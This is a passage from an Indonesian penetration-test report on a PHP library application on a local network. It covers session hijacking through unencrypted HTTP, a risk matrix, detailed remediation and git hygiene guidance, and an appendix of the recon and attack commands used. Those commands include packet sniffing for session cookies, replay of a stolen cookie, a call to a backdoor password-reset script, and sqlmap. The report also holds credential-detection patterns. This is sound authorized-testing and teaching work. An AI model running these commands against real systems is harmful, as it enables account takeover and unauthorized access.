Cookie: PHPSESSID=4n6oejviie5hn43m4enln66s7p
```

**Test login dengan cookie curian:**
```bash
curl -b "PHPSESSID=4n6oejviie5hn43m4enln66s7p" \
  http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/backend/admin/index.php
```

**Hasil:** ✅ **BERHASIL** — login sebagai admin tanpa password.

**Kesimpulan:** Aplikasi **VULNERABLE** terhadap session hijacking karena berjalan di HTTP tanpa TLS/SSL.

## 6. Matriks Risiko

| #   | Temuan                                | Severity    | CVSS | Status                    |
|-----|---------------------------------------|-------------|------|---------------------------|
| 4.1 | Backdoor Reset Password               | 🔴 Critical | 9.8 | Confirmed (berhasil)      |
| 4.2 | Kredensial DB Hardcoded (root kosong) | 🔴 Critical | 9.1 | Confirmed                 |
| 4.3 | Source Code Bocor via GitHub Public   | 🟠 High     | 8.2 | Confirmed                 |
| 4.4 | .git Directory Bisa Diakses           | 🟠 High     | 7.5 | Confirmed                 |
| 4.5 | Session Hijacking via HTTP Sniffing   | 🟠 High     | 8.1 | Confirmed (berhasil)      |
| 4.6 | Database SQL Dump Tersedia            | 🟡 Medium   | 6.5 | Confirmed                 |
| 4.7 | Backup Folder `perpus_work/`          | 🟡 Medium   | 5.3 | Confirmed (403)           |
| 4.8 | Informasi Server Bocor                | 🟢 Low      | 3.7 | Confirmed                 |

**Total:** **2 Critical, 3 High**, 2 Medium, 1 Low

## 7. Rekomendasi Perbaikan

### Prioritas 1 (Immediate)
1. **Hapus file** `login/reset_password.php` dari server
2. **Rotasi seluruh password** (admin, petugas, user, DB)
3. **Ganti password MySQL `root`** — jangan kosong
4. **Private-kan repo GitHub** atau hapus credential dari history:
   ```bash
   git filter-repo --path backend/assets/database.sql --invert-paths
   git filter-repo --path REVISI.md --invert-paths
   git push origin --force --all
   ```
5. **Blokir akses `.git`** di web server:
   ```apache
   RedirectMatch 404 /\.git
   ```
6. **Aktifkan HTTPS (TLS/SSL)** — ini **WAJIB** untuk mencegah session hijacking:
   ```apache
   # Apache — aktifkan mod_ssl
   a2enmod ssl
   
   # Generate self-signed cert (untuk testing)
   openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
   
   # Konfigurasi VirtualHost
   <VirtualHost *:443>
       SSLEngine on
       SSLCertificateFile /path/to/cert.pem
       SSLCertificateKeyFile /path/to/key.pem
       DocumentRoot "C:/xampp/htdocs/UK-PKL_Banjar/UK1/UK1-Diki"
   </VirtualHost>
   ```
7. **Redirect HTTP ke HTTPS:**
   ```apache
   <VirtualHost *:80>
       Redirect permanent / https://192.168.1.12/
   </VirtualHost>
   ```
8. **Update `session_set_cookie_params()`** dengan flag `Secure`:
   ```php
   session_set_cookie_params([
       'lifetime' => 0,
       'path'     => '/',
       'domain'   => '',
       'secure'   => true,        // ← WAJIB kalau HTTPS
       'httponly' => true,
       'samesite' => 'Strict',
   ]);
   ```

### Prioritas 2 (Short-term)
9. **Hapus folder** `perpus_work/` dari server
10. **Hapus file `.sql`** dari repo + tambahkan ke `.gitignore`
11. **Pindahkan kredensial** ke environment variable (`.env`)
12. **Batasi akses MySQL** — hanya dari `localhost`
13. **Sembunyikan versi server** (`ServerTokens Prod`, `expose_php = Off`)
14. **Tambahkan session timeout** (15-30 menit idle)
15. **Bind session ke IP + User-Agent**

### Prioritas 3 (Long-term)
16. **Aktifkan logging & monitoring** untuk akses file sensitif
17. **Security awareness training** untuk developer
18. **Gunakan `.gitignore`** yang proper sebelum commit (lihat [Bagian 8](#8-panduan-aman-push-ke-github))
19. **Scan credential** sebelum push (TruffleHog / Gitleaks)
20. **2FA** di akun GitHub

## 8. Panduan Aman Push ke GitHub

> **Prinsip:** Jangan pernah commit apapun yang kamu nggak mau dilihat publik. GitHub itu public by default, dan history tersimpan selamanya.

### 8.1 Buat `.gitignore` yang Proper

```gitignore
# ===== CREDENTIAL & SECRET =====
.env
.env.*
!.env.example
*.key
*.pem
*.p12
secrets.json
credentials.json

# ===== DATABASE =====
*.sql
*.sqlite
*.db
*.dump

# ===== CONFIG =====
app/config/Database.php
frontend/database/connection.php
login/database/connection.php

# ===== BACKDOOR / FIX SCRIPTS =====
fix.php
reset_*.php
test_*.php
*_backup.php

# ===== BACKUP & LOG =====
*.bak
*.backup
*.old
*.log
logs/

# ===== IDE & OS =====
.vscode/
.idea/
*.swp
.DS_Store
Thumbs.db

# ===== DEPENDENCIES =====
node_modules/
vendor/
__pycache__/

# ===== UPLOAD =====
assets/uploads/*
!assets/uploads/.gitkeep
```

### 8.2 Gunakan Environment Variable

**Install:**
```bash
composer require vlucas/phpdotenv
```

**Buat `.env` (JANGAN di-commit):**
```env
DB_HOST=localhost
DB_NAME=perpustakaan-v2
DB_USER=perpus_app
DB_PASS=StrongP@ssw0rd!2026
```

**Buat `.env.example` (INI yang di-commit):**
```env
DB_HOST=localhost
DB_NAME=your_db_name
DB_USER=your_db_user
DB_PASS=your_db_password
```

**Update `app/config/Database.php`:**
```php
<?php
require_once __DIR__ . '/../../vendor/autoload.php';

$dotenv = Dotenv\Dotenv::createImmutable(__DIR__ . '/../..');
$dotenv->load();

class Database
{
    private string $host;
    private string $dbName;
    private string $username;
    private string $password;

    public function __construct()
    {
        $this->host     = $_ENV['DB_HOST'];
        $this->dbName   = $_ENV['DB_NAME'];
        $this->username = $_ENV['DB_USER'];
        $this->password = $_ENV['DB_PASS'];
    }
    // ...
}
```

### 8.3 Scan Credential Sebelum Push

**TruffleHog:**
```bash
pip install trufflehog
trufflehog git file://. --only-verified
```

**Gitleaks:**
```bash
docker run -v $(pwd):/path zricethezav/gitleaks:latest detect \
  --source="/path" --verbose
```

**Manual grep:**
```bash
grep -rniE "password|passwd|secret|api_key|token|private_key" . \
  --exclude-dir=.git --exclude-dir=node_modules --exclude-dir=vendor
```

### 8.4 Pre-commit Hook — Cegah Commit Credential

Buat file `.git/hooks/pre-commit`:

```bash
#!/bin/bash
PATTERNS=(
    "password\s*=\s*['\"][^'\"]+['\"]"
    "passwd\s*=\s*['\"][^'\"]+['\"]"
    "secret\s*=\s*['\"][^'\"]+['\"]"
    "api_key\s*=\s*['\"][^'\"]+['\"]"
    "token\s*=\s*['\"][^'\"]+['\"]"
    "BEGIN RSA PRIVATE KEY"
    "BEGIN OPENSSH PRIVATE KEY"
)

FILES=$(git diff --cached --name-only --diff-filter=ACM)
for file in $FILES; do
    for pattern in "${PATTERNS[@]}"; do
        if grep -qiE "$pattern" "$file" 2>/dev/null; then
            echo "❌ COMMIT DITOLAK: Potensi credential di file '$file'"
            echo "   Pattern: $pattern"
            exit 1
        fi
    done
done
echo "✅ Pre-commit check passed"
exit 0
```

Beri permission:
```bash
chmod +x .git/hooks/pre-commit
```

### 8.5 Kalau Sudah Terlanjur Commit — Bersihkan History

**Pakai `git-filter-repo`:**
```bash
pip install git-filter-repo
git filter-repo --path backend/assets/database.sql --invert-paths
git filter-repo --path REVISI.md --invert-paths
git filter-repo --path app/config/Database.php --invert-paths
git push origin --force --all
git push origin --force --tags
```

**Atau pakai BFG Repo-Cleaner:**
```bash
wget https://repo1.maven.org/maven2/com/madgag/bfg/1.14.0/bfg-1.14.0.jar
java -jar bfg-1.14.0.jar --delete-files "*.sql"
java -jar bfg-1.14.0.jar --delete-files "REVISI.md"
git reflog expire --expire=now --all
git gc --prune=now --aggressive
git push origin --force --all
```

> ⚠️ **Wajib:** Rotasi semua password yang bocor — history GitHub mungkin sudah di-cache / di-fork orang lain.

### 8.6 Checklist Sebelum Push

```
[ ] .gitignore sudah dibuat & proper
[ ] File .env TIDAK di-commit (hanya .env.example)
[ ] File config/Database.php TIDAK di-commit
[ ] File *.sql TIDAK di-commit
[ ] File reset_*.php / fix.php TIDAK di-commit
[ ] Credential di source code pakai environment variable
[ ] Pre-commit hook sudah dipasang
[ ] Scan credential pakai TruffleHog / Gitleaks
[ ] git status bersih dari file sensitif
[ ] git diff --cached sudah direview
[ ] Repo GitHub di-set private (kalau perlu)
[ ] GitHub Secrets dipakai untuk CI/CD
[ ] 2FA aktif di akun GitHub
```

### 8.7 Alur Push yang Benar

```bash
# 1. Inisialisasi git
git init

# 2. Buat .gitignore DULU sebelum apapun
cat > .gitignore << 'EOF'
.env
.env.*
!.env.example
*.sql
*.log
app/config/Database.php
reset_*.php
EOF

# 3. Tambahkan file yang aman
git add .gitignore
git add README.md
git add app/
git add frontend/
git add backend/
git add login/
git add index.php

# 4. Cek apa yang akan di-commit
git status
git diff --cached

# 5. Scan credential
grep -rniE "password|secret|api_key" . --exclude-dir=.git

# 6. Commit
git commit -m "Initial commit"

# 7. Push ke GitHub
git remote add origin https://github.com/username/repo.git
git branch -M main
git push -u origin main
```

### 8.8 Emergency Response — Kalau Credential Bocor

**Immediate (0-1 jam):**
1. Rotasi semua password yang bocor
2. Revoke API key / token yang bocor
3. Hapus file dari repo + history
4. Force push ke remote

**Short-term (1-24 jam):**
5. Cek log akses — apakah ada login mencurigakan?
6. Notifikasi tim
7. Monitor akun / sistem terkait

**Long-term (1-7 hari):**
8. Audit semua repo untuk credential lain
9. Update `.gitignore` di semua repo
10. Training developer soal security

## 9. Lampiran

### A. Command yang Digunakan

```bash
# Reconnaissance
feroxbuster -u http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -x php,html -s 200,302 --silent -d 2 -o ferox_clean.txt

arjun -u http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/

# Git dump
git-dumper http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/.git/ ./diki_source

# GitHub API check
curl -s https://api.github.com/repos/gh0st4n/UK1-Diki | jq .
git clone https://github.com/gh0st4n/UK1-Diki.git

# Git history analysis
git log --oneline --all
git log --all --full-history -- "*.sql" "*.md"
git show 2412388:REVISI.md

# Credential search
grep -rn "admin123\|petugas123\|12345678" --include="*.php" .

# Exploit backdoor reset password
curl http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/login/reset_password.php

# Cek port MySQL
nmap -p 3306 192.168.1.12

# SQLMap (gagal — target aman)
sqlmap -u "http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/frontend/page/pinjam.php?id=19" \
  --cookie="PHPSESSID=<valid>" --dbs --batch --level=3 --risk=2

# Session Hijacking via Wireshark
# 1. Start Wireshark di Kali
sudo wireshark

# 2. Filter: http.cookie
# 3. Tunggu user login
# 4. Follow HTTP Stream → dapat PHPSESSID

# Atau via tcpdump
sudo tcpdump -i eth1 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' | grep -i "cookie\|phpsessid"

# 5. Test cookie curian
curl -b "PHPSESSID=<COOKIE_CURIAN>" http://192.168.1.12/UK-PKL_Banjar/UK1/UK1-Diki/backend/admin/index.php
```

### B. Timeline

| Tanggal     | Aktivitas                                                    |
|-------------|--------------------------------------------------------------|
| 28 Sep 2026 | Feroxbuster scan (directory & file)                          |
| 28 Sep 2026 | Arjun parameter discovery                                    |
| 28 Sep 2026 | Hakrawler + Katana crawling                                  |
| 28 Sep 2026 | Git-dumper — sebagian berhasil (objects diblokir)            |
| 28 Sep 2026 | Analisis `.git/config` — remote GitHub bocor                 |
| 28 Sep 2026 | Clone repo GitHub public                                     |
| 28 Sep 2026 | Analisis source code — temukan `reset_password.php`          |
| 28 Sep 2026 | Eksekusi backdoor — semua akun ke-reset ✅                   |
| 28 Sep 2026 | Cek kredensial DB — `root` tanpa password                    |
| 28 Sep 2026 | Analisis upload handler — whitelist aman                     |
| 28 Sep 2026 | SQLMap test — gagal (target aman dari SQLi)                  |
| 28 Sep 2026 | **Session hijacking test via Wireshark — BERHASIL**          |
| 28 Sep 2026 | **Login sebagai admin, petugas, user pakai cookie curian**   |
| 28 Sep 2026 | Dokumentasi laporan                                          |

### C. Struktur File yang Ter-recover

```
diki_repo/
├── app/
│   ├── config/
│   │   └── Database.php              ← Kredensial DB (root, kosong)
│   └── helpers/
│       └── auth.php                  ← Session, CSRF, role check
├── assets/
│   └── uploads/cover/                ← File upload
├── backend/
│   ├── admin/index.php
│   ├── petugas/index.php
│   ├── shared/
│   │   ├── buku_proses.php           ← Upload handler
│   │   ├── kategori_proses.php
│   │   ├── peminjaman_proses.php
│   │   ├── pengembalian_proses.php
│   │   └── pengguna_proses.php
│   ├── assets/
│   │   ├── database.sql              ← DB dump (hash password)
│   │   └── database_update.sql
│   └── layouts/header.php            ← Role-based access
├── frontend/
│   ├── database/connection.php       ← Kredensial DB (root, kosong)
│   ├── page/
│   │   ├── pinjam.php
│   │   ├── pinjam_proses.php
│   │   ├── peminjaman_berhasil.php
│   │   └── riwayat.php
│   ├── partials/
│   └── includes/functions.php
├── login/
│   ├── pages/
│   │   ├── login.php                 ← Form login
│   │   └── register.php              ← Form register
│   ├── function/
│   │   ├── proses_login.php          ← Login handler
│   │   ├── proses_register.php       ← Register handler
│   │   └── logout.php
│   ├── database/connection.php       ← Kredensial DB (root, kosong)
│   └── reset_password.php            ← 🔴 BACKDOOR!
├── perpus_work/                      ← Backup folder (403)
├── index.php
└── .htaccess
```

### D. Referensi

- OWASP Top 10 2021:
  - A01: Broken Access Control
  - A02: Cryptographic Failures
  - A05: Security Misconfiguration
  - A07: Identification and Authentication Failures
- CWE-538: File and Directory Information Exposure
- CWE-798: Use of Hard-coded Credentials
- CWE-548: Exposure of Information Through Directory Listing
- CWE-319: Cleartext Transmission of Sensitive Information
- CWE-522: Insufficiently Protected Credentials
- CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
- CWE-306: Missing Authentication for Critical Function
- CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag
- OWASP: Session Hijacking
- GitHub Docs: Removing sensitive data from a repository

---

**— END OF REPORT —**

*Laporan ini dibuat untuk keperluan pembelajaran / authorized pentest. Penggunaan tanpa izin adalah ilegal.*